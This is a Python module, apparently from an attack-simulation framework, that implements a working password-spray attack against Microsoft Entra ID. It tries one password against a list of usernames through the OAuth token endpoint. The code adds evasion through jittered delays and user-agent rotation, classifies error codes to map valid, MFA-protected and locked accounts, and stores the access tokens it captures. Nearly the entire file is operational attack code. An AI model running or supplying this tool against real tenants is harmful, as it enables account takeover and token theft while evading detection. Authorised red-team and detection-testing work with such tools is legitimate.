from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, TechniqueReference, TechniqueNote
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from core.entra.entra_token_manager import EntraTokenManager
import requests
import base64
import time
import random
from datetime import datetime

@TechniqueRegistry.register
class EntraPasswordSpray(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1110.003",
                technique_name="Brute Force",
                tactics=["Credential Access", "Initial Access"],
                sub_technique_name="Password Spraying"
            )
        ]
        
        # References for the technique
        references = [
            TechniqueReference(
                ref_title="Microsoft - Password Spray Attack Detection",
                ref_link="https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks#password-spray"
            )
        ]
        
        # Notes
        notes = [
            TechniqueNote(
                "Configure appropriate delays between authentication attempts (recommended: 30+ seconds) to avoid triggering account lockout policies and detection mechanisms."
            ),
            TechniqueNote(
                "Enable jitter to randomize request timing and avoid creating predictable traffic patterns that security tools can easily detect."
            )
        ]
        
        super().__init__(
            "Password Spray", 
            "Execute a sophisticated password spray attack against Entra ID by systematically attempting authentication with a single password against multiple usernames. This technique includes evasion capabilities such as randomized timing with jitter, multiple user-agent rotation, error code analysis, and retry logic. The technique supports multiple authentication endpoints and client IDs. The technique can operate effectively in large environments by implementing rate limiting, batching capabilities, and detailed progress tracking. It can identify successful password matches along with accounts with expired passwords, locked accounts, disabled accounts, and MFA-enabled accounts, providing valuable reconnaissance information for subsequent attacks.", 
            mitre_techniques, 
            references=references, 
            notes=notes
        )

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        
        try:
            # Extract and validate parameters
            password: str = kwargs.get('password', None)
            username_file: str = kwargs.get('username_file', None)
            client_id: str = kwargs.get('client_id', 'd3590ed6-52b3-4102-aeff-aad2292ab01c')
            wait_time: int = kwargs.get('wait_time', 30)
            jitter: bool = kwargs.get('jitter', True)
            max_jitter: int = kwargs.get('max_jitter', 15)
            batch_size: int = kwargs.get('batch_size', 50)
            user_agent: str = kwargs.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            target_endpoint: str = kwargs.get('target_endpoint', None)
            stop_on_success: bool = kwargs.get('stop_on_success', False)
            save_tokens: bool = kwargs.get('save_tokens', True)
            set_as_active_token: bool = kwargs.get('set_as_active_token', False)
            enable_retry: bool = kwargs.get('enable_retry', True)
            max_retries: int = kwargs.get('max_retries', 3)
            
            # Input validation
            if password in [None, ""] or username_file in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": "Password and username file are required parameters"
                }
            
            # Set default values for optional parameters
            if client_id in [None, ""]:
                client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            
            if wait_time in [None, ""] or wait_time < 1:
                wait_time = 30

            if batch_size in [None, ""] or batch_size < 1 or batch_size > 1000:
                batch_size = 50

            if max_retries in [None, ""] or max_retries < 0:
                max_retries = 3

            if max_jitter in [None, ""] or max_jitter < 0:
                max_jitter = 15

            if jitter not in [True, False]:
                jitter = True
            
            if stop_on_success not in [True, False]:
                stop_on_success = False
            
            if save_tokens not in [True, False]:
                save_tokens = True

            if set_as_active_token not in [True, False]:
                set_as_active_token = False
            
            if enable_retry not in [True, False]:
                enable_retry = True

            # Set default authentication endpoint
            endpoint_url = target_endpoint if target_endpoint else "https://login.microsoft.com/common/oauth2/token"
            resource = "https://graph.microsoft.com"
            scope = ['openid']

            # Headers with user agent rotation
            user_agents = [
                user_agent,
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            ]

            # Add user provided custom user agent if not already in the list
            if user_agent not in user_agents and user_agent not in ["", None]:
                user_agents.append(user_agent)
            
            # Extract usernames from uploaded file
            content_string = username_file.split(',')[-1]
            decoded = base64.b64decode(content_string)
            try:
                text = decoded.decode('utf-8')
                user_list = [user.strip() for user in text.split('\n') if user.strip()]
                # Remove duplicates while preserving order
                user_list = list(dict.fromkeys(user_list))
            except Exception as e:
                return ExecutionStatus.FAILURE, {
                    "error": str(e),
                    "message": "Failed to decode username file. Ensure file is in UTF-8 format."
                }

            if not user_list:
                return ExecutionStatus.FAILURE, {
                    "error": "Empty username list",
                    "message": "No valid usernames found in the uploaded file"
                }

            # Initialize tracking variables
            spray_results = {
                "successful_auths": [],
                "mfa_required": [],
                "password_expired": [],
                "account_locked": [],
                "account_disabled": [],
                "failed_attempts": [],
                "unknown_errors": []
            }
            
            total_attempts = 0
            successful_attempts = 0
            batch_count = 0
            start_time = datetime.now()

            # Process usernames in batches
            for i in range(0, len(user_list), batch_size):
                batch = user_list[i:i + batch_size]
                batch_count += 1
                
                print(f"Processing batch {batch_count}: {len(batch)} usernames")
                
                for username in batch:
                    if username in [None, ""]:
                        continue
                    
                    total_attempts += 1
                    retry_count = 0
                    success = False
                    
                    while retry_count <= max_retries and not success:
                        try:
                            # Rotate user agent
                            current_headers = {
                                "Accept": "application/json",
                                "Content-Type": "application/x-www-form-urlencoded",
                                "User-Agent": random.choice(user_agents)
                            }
                            
                            # Create request payload
                            data = {
                                "grant_type": "password",
                                "password": password,
                                "client_id": client_id,
                                "username": username,
                                "resource": resource,
                                "scope": ' '.join(scope)
                            }
                            
                            # Make authentication request
                            raw_response = requests.post(
                                url=endpoint_url, 
                                headers=current_headers, 
                                data=data,
                                timeout=30
                            )
                            
                            # Process response
                            if 200 <= raw_response.status_code < 300:
                                # Successful authentication
                                access_token = raw_response.json().get('access_token')
                                token_info = {
                                    "username": username,
                                    "password": password,
                                    "access_token": access_token,
                                    "timestamp": datetime.now().isoformat(),
                                    "client_id": client_id
                                }
                                
                                spray_results["successful_auths"].append(token_info)
                                successful_attempts += 1
                                
                                # Save token if requested
                                if save_tokens and access_token:
                                    EntraTokenManager().add_token(access_token)
                                    token_info["token_saved"] = True
                                    
                                    if set_as_active_token:
                                        EntraTokenManager().set_active_token(access_token)
                                        token_info["token_active"] = True
                                
                                success = True
                                
                                # Stop on first success if configured
                                if stop_on_success:
                                    execution_time = (datetime.now() - start_time).total_seconds()
                                    return ExecutionStatus.SUCCESS, {
                                        "message": f"Password spray stopped on first success: {username}",
                                        "value": {
                                            "results": spray_results,
                                            "statistics": {
                                                "total_usernames": len(user_list),
                                                "attempted_usernames": total_attempts,
                                                "successful_attempts": successful_attempts,
                                                "execution_time_seconds": execution_time,
                                                "success_rate": (successful_attempts / total_attempts) * 100
                                            }
                                        }
                                    }
                            
                            elif raw_response.status_code == 400:
                                # Analyze error response
                                error_response = raw_response.json()
                                error_codes = error_response.get('error_codes', [])
                                error_description = error_response.get('error_description', '')
                                
                                # Categorize based on error codes
                                if any(code in [50076, 50079] for code in error_codes):
                                    # MFA required - valid credentials
                                    spray_results["mfa_required"].append({
                                        "username": username,
                                        "error_codes": error_codes,
                                        "description": "Multi-factor authentication required"
                                    })
                                elif any(code in [50072, 50074] for code in error_codes):
                                    # Password expired or needs change
                                    spray_results["password_expired"].append({
                                        "username": username,
                                        "error_codes": error_codes,
                                        "description": "Password expired or change required"
                                    })
                                elif any(code in [50057, 50005] for code in error_codes):
                                    # Account disabled or locked
                                    spray_results["account_disabled"].append({
                                        "username": username,
                                        "error_codes": error_codes,
                                        "description": "Account disabled or locked"
                                    })
                                elif any(code in [50034, 50053] for code in error_codes):
                                    # Account locked
                                    spray_results["account_locked"].append({
                                        "username": username,
                                        "error_codes": error_codes,
                                        "description": "Account locked due to suspicious activity"
                                    })
                                else:
                                    # Invalid credentials or other errors
                                    spray_results["failed_attempts"].append({
                                        "username": username,
                                        "error_codes": error_codes,
                                        "description": error_description
                                    })
                                
                                success = True  # Don't retry for application errors
                                
                            else:
                                # Network or server errors - might be worth retrying
                                if enable_retry and retry_count < max_retries:
                                    retry_count += 1
                                    time.sleep(5)  # Short delay before retry
                                    continue
                                else:
                                    spray_results["unknown_errors"].append({
                                        "username": username,
                                        "status_code": raw_response.status_code,
                                        "error": "Network or server error"
                                    })
                                    success = True
                        
                        except requests.exceptions.RequestException as e:
                            if enable_retry and retry_count < max_retries:
                                retry_count += 1
                                time.sleep(5)
                                continue
                            else:
                                spray_results["unknown_errors"].append({
                                    "username": username,
                                    "error": str(e),
                                    "description": "Network request failed"
                                })
                                success = True
                        
                        except Exception as e:
                            spray_results["unknown_errors"].append({
                                "username": username,
                                "error": str(e),
                                "description": "Unexpected error during authentication"
                            })
                            success = True
                    
                    # Apply delay with optional jitter
                    if total_attempts < len(user_list):  # Don't wait after last attempt
                        delay = wait_time
                        if jitter:
                            jitter_value = random.randint(0, max_jitter)
                            delay += jitter_value
                        
                        time.sleep(delay)
                
                # Brief pause between batches
                if batch_count * batch_size < len(user_list):
                    time.sleep(2)

            # Calculate final statistics
            execution_time = (datetime.now() - start_time).total_seconds()
            
            # Determine execution status
            if successful_attempts > 0:
                status = ExecutionStatus.SUCCESS
                message = f"Password spray completed successfully. Found {successful_attempts} valid credentials."
            elif (len(spray_results["mfa_required"]) + 
                  len(spray_results["password_expired"]) + 
                  len(spray_results["account_locked"])) > 0:
                status = ExecutionStatus.SUCCESS
                message = "Password spray completed. Found valid usernames but authentication blocked."
            else:
                status = ExecutionStatus.SUCCESS
                message = "Password spray completed. No valid credentials found."

            return status, {
                "message": message,
                "value": {
                    "statistics": {
                        "total_usernames": len(user_list),
                        "attempted_usernames": total_attempts,
                        "successful_attempts": successful_attempts,
                        "mfa_accounts": len(spray_results["mfa_required"]),
                        "expired_passwords": len(spray_results["password_expired"]),
                        "locked_accounts": len(spray_results["account_locked"]),
                        "disabled_accounts": len(spray_results["account_disabled"]),
                        "failed_attempts": len(spray_results["failed_attempts"]),
                        "unknown_errors": len(spray_results["unknown_errors"]),
                        "execution_time_seconds": execution_time,
                        "success_rate": (successful_attempts / total_attempts) * 100 if total_attempts > 0 else 0,
                        "batches_processed": batch_count
                    },
                    "results": spray_results,
                    "configuration": {
                        "password": password,
                        "client_id": client_id,
                        "wait_time": wait_time,
                        "jitter_enabled": jitter,
                        "batch_size": batch_size,
                        "stop_on_success": stop_on_success,
                        "endpoint": endpoint_url
                    }
                }
            }

        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to execute enhanced password spray attack"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "password": {
                "type": "str", 
                "required": True, 
                "default": None, 
                "name": "Password", 
                "input_field_type": "password"
            },
            "username_file": {
                "type": "str", 
                "required": True, 
                "default": None, 
                "name": "Username List File", 
                "input_field_type": "upload"
            },
            "client_id": {
                "type": "str", 
                "required": False, 
                "default": "d3590ed6-52b3-4102-aeff-aad2292ab01c", 
                "name": "Microsoft Graph Client ID", 
                "input_field_type": "text"
            },
            "wait_time": {
                "type": "int", 
                "required": False, 
                "default": 30, 
                "name": "Wait Time Between Attempts (seconds)", 
                "input_field_type": "number"
            },
            "jitter": {
                "type": "bool", 
                "required": False, 
                "default": True, 
                "name": "Enable Timing Jitter", 
                "input_field_type": "bool"
            },
            "max_jitter": {
                "type": "int", 
                "required": False, 
                "default": 15, 
                "name": "Maximum Jitter (seconds)", 
                "input_field_type": "number"
            },
            "batch_size": {
                "type": "int", 
                "required": False, 
                "default": 50, 
                "name": "Batch Size", 
                "input_field_type": "number"
            },
            "user_agent": {
                "type": "str", 
                "required": False, 
                "default": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", 
                "name": "User Agent String", 
                "input_field_type": "text"
            },
            "target_endpoint": {
                "type": "str", 
                "required": False, 
                "default": "https://login.microsoft.com/common/oauth2/token", 
                "name": "Target Authentication Endpoint", 
                "input_field_type": "text"
            },
            "stop_on_success": {
                "type": "bool", 
                "required": False, 
                "default": False, 
                "name": "Stop on First Success", 
                "input_field_type": "bool"
            },
            "save_tokens": {
                "type": "bool", 
                "required": False, 
                "default": True, 
                "name": "Save Successful Tokens", 
                "input_field_type": "bool"
            },
            "set_as_active_token": {
                "type": "bool", 
                "required": False, 
                "default": False, 
                "name": "Set First Token as Active", 
                "input_field_type": "bool"
            },
            "enable_retry": {
                "type": "bool", 
                "required": False, 
                "default": True, 
                "name": "Enable Retry on Network Errors", 
                "input_field_type": "bool"
            },
            "max_retries": {
                "type": "int", 
                "required": False, 
                "default": 3, 
                "name": "Maximum Retry Attempts", 
                "input_field_type": "number"
            }
        }